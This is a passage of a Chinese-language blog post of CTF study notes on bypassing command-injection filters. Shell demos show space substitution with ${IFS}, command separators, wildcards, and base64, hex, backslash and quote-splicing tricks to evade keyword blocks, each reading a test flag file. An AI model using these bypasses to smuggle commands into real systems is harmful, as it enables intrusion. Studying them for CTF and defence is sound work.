<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">passthru</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h2 id="绕过姿势" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e5%a7%bf%e5%8a%bf" class="header-mark"></a>绕过姿势</h2><h3 id="空格绕过" class="headerLink">
    <a href="#%e7%a9%ba%e6%a0%bc%e7%bb%95%e8%bf%87" class="header-mark"></a>空格绕过</h3><p>在ban掉空格的情况下，可以使用字符进行替换</p>
<ul>
<li><code>&lt;</code> 重定向</li>
<li><code>$IFS$9</code>  $9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串</li>
<li><code>${IFS}</code></li>
<li><code>%09</code>
<br/></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat&lt;flag.txt 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat${IFS}$1flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat${IFS}$9flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat${IFS}flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>%09绕过
<img
        class="lazyload"
        data-src="09.png"
        data-srcset="09.png, 09.png 1.5x, 09.png 2x"
        data-sizes="auto"
        alt="09.png"
        title="09.png"></p>
<br/>
<h3 id="符号绕过" class="headerLink">
    <a href="#%e7%ac%a6%e5%8f%b7%e7%bb%95%e8%bf%87" class="header-mark"></a>符号绕过</h3><ul>
<li><code>&amp;&amp;</code> 只有前面的命令执行成功，才执行拼接后面的命令</li>
<li><code>||</code> 只有前面的命令执行失败，才执行拼接后面的命令</li>
<li><code>|</code>  管道符，将左边输出的内容作为右边的命令的输入，所以左边的内容并不输出</li>
<li><code>&amp;</code>  将此进程设置为后台进程</li>
<li><code>;</code>  分号为Linux中的命令分隔符</li>
<li><code>{}</code> 绕过</li>
<li><code>%0a</code> 换行符
<br/></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># whoami &amp;&amp; cat flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span>
</span></span><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># test  ||  cat flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># echo &#34;hello&#34; |  cat flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># pwd &amp;  cat flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="mi">9652</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">root</span>
</span></span><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span>  <span class="nx">Done</span>                    <span class="nx">pwd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># pwd;cat flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">/</span><span class="nx">root</span>
</span></span><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># {cat,flag.txt}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h3 id="通配符绕过" class="headerLink">
    <a href="#%e9%80%9a%e9%85%8d%e7%ac%a6%e7%bb%95%e8%bf%87" class="header-mark"></a>通配符绕过</h3><ul>
<li><code>*</code> 代表0到无穷个任意字符</li>
<li><code>?</code> 一个任意字符</li>
<li><code>[ - ]</code> 表示在这个区间的任意字符，如[a-z]表示a到z的26个字符</li>
<li><code>[^]</code> 表示取反，如[^a]表示非a字符</li>
</ul>
<br/>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat fl*g.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat fl?g.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat fl[a,b,c,d]g.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat fl[a-z]g.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat fl[^b]g.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h3 id="关键字绕过" class="headerLink">
    <a href="#%e5%85%b3%e9%94%ae%e5%ad%97%e7%bb%95%e8%bf%87" class="header-mark"></a>关键字绕过</h3><ul>
<li>变量绕过</li>
<li>编码绕过</li>
<li>反斜杠</li>
<li>拼接符</li>
<li>历史命令绕过</li>
<li><code>$*</code>、<code>$@</code>、<code>$x</code>（x表示1-9）、<code>${x}</code>（x为任意字母或数字）,在没有传参的情况下，这些特殊变量都是为空</li>
</ul>
<br/>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//变量绕过
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># a=l;b=s;$a$b
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Desktop</span>  <span class="nx">Documents</span>  <span class="nx">Downloads</span>  <span class="nx">flag</span><span class="o">.</span><span class="nx">txt</span>  <span class="nx">Music</span>  <span class="nx">Pictures</span>  <span class="k">Public</span>  <span class="nx">Templates</span>  <span class="nx">Videos</span>  <span class="nx">vmware</span><span class="o">-</span><span class="nx">tools</span><span class="o">-</span><span class="nx">distrib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//base64绕过
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># ` echo &#34;Y2F0IGZsYWcudHh0Cg==&#34; | base64 -d` 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//十六进制绕过
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># `echo 63617420666c61672e7478740a | xxd -r -p`
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//反斜杠
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># ca\t \f\l\a\g.\t\x\t
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//拼接符
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># cat &#34;f&#34;lag.&#34;t&#34;x&#34;t&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//特殊变量
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># ca$*t flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># ca$@t flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># ca$2t flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>利用历史命令绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># ca
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># t
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># fla
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># g.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># history 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="mi">1</span>  <span class="nx">ca</span>
</span></span><span class="line"><span class="cl">    <span class="mi">2</span>  <span class="nx">t</span>
</span></span><span class="line"><span class="cl">    <span class="mi">3</span>  <span class="nx">fla</span>
</span></span><span class="line"><span class="cl">    <span class="mi">4</span>  <span class="nx">g</span><span class="o">.</span><span class="nx">txt</span>
</span></span><span class="line"><span class="cl">    <span class="mi">5</span>  <span class="nx">history</span> 
</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="o">@</span><span class="nx">gnq</span><span class="o">:~</span><span class="c1"># !1!2 !3!4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">cat</span> <span class="nx">flag</span><span class="o">.</span><span class="nx">txt</span>
</span></span><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="mi">2333333_</span><span class="nx">test_file</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h2 id="参考" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83" class="header-mark"></a>参考</h2><p>参考内容（侵删）：
<a href="https://blog.csdn.net/JBlock/article/details/88311388" target="_blank" rel="noopener noreffer">CTF命令执行及绕过技巧</a>
<a href="https://xz.aliyun.com/t/3918" target="_blank" rel="noopener noreffer">Bypass一些命令注入限制的姿势</a></p>
</div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2020-07-29</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="prev" rel="prev" title="文件上传"><i class="fas fa-angle-left fa-fw"></i>文件上传</a>
            <a href="/sql%E6%B3%A8%E5%85%A5/" class="next" rel="next" title="SQL注入">SQL注入<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">高诺琪</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>

<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":true,"location":0,"maxResultLength":6,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":10,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
</body>

</html>